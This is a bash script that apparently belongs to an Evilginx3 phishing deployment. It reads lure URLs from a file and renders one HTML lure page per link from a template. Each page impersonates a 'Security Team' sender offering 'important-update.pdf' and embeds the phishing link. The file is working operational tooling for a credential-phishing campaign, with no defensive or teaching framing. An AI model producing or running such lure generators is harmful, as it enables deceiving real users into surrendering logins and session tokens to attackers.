#!/bin/bash
# === LURE INJECTOR MULTILINK (ENTERPRISE-GRADE) ===
# Parses lures.txt and renders per-link HTML lures with injection-ready content
# Output: /opt/posh-ai/evilginx3/redirectors/rendered/*.html

set -euo pipefail

### === CONFIGURATION ===
LURE_FILE="/opt/posh-ai/evilginx3/data/lures.txt"
TEMPLATE="/opt/posh-ai/evilginx3/redirectors/download_example/index.template.html"
RENDER_DIR="/opt/posh-ai/evilginx3/redirectors/rendered"
FROM_NAME="Security Team"
FILENAME="important-update.pdf"

mkdir -p "$RENDER_DIR"

### === UTILITIES ===
log() { echo -e "\033[1;36m[LURE-INJECT]\033[0m $*"; }
fatal() { echo -e "\033[1;31m[✘] $*" >&2; exit 1; }

### === VALIDATION ===
[[ -f "$LURE_FILE" ]] || fatal "Missing: $LURE_FILE"
[[ -f "$TEMPLATE" ]] || fatal "Missing: $TEMPLATE"

### === LOOP & RENDER ===
i=1
while IFS= read -r line; do
  if [[ "$line" =~ ^Via ]]; then
    lure_url=$(echo "$line" | awk -F': ' '{print $2}')
    out_file="$RENDER_DIR/lure_$i.html"

    sed \
      -e "s|{from_name}|$FROM_NAME|g" \
      -e "s|{filename}|$FILENAME|g" \
      -e "s|{lure_url_js}|\"$lure_url\"|g" \
      "$TEMPLATE" > "$out_file"

    log "Rendered: $out_file"
    ((i++))
  fi
done < "$LURE_FILE"

log "✅ All lures rendered → $RENDER_DIR"
